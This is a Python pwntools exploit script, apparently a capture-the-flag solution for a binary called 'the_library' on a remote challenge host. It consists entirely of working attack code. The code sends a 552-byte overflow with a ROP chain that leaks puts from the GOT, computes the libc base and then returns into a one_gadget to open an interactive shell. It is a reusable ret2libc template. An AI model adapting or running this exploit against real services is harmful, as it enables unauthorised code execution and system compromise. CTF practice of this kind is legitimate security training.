#!/usr/bin/env python
from pwn import *
import struct

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './the_library'
host = 'challenge.ctf.games'
port = 30384

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
elf = ELF(exe)

libc_start_main = 552
one_gadget = 0xe6c81
pop_rdi = 0x401493

buf = b''
buf += b'A' * libc_start_main
buf += p64(pop_rdi)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)

io = start()

io.sendlineafter('> ', buf)

io.readuntil(b'Wrong :(\n')

line = io.readline()[0:6] + b'\x00' * 2
libc_leak = u64(line)

libc = ELF('libc-2.31.so')
libc_base = libc_leak - libc.sym.puts
libc.address = libc_base

log.info(f'libc base @ 0x{libc.address:x}')


buf = b''
buf += b'A' * libc_start_main
buf += p64(libc.address + one_gadget)

io.sendlineafter('> ', buf)

io.interactive()

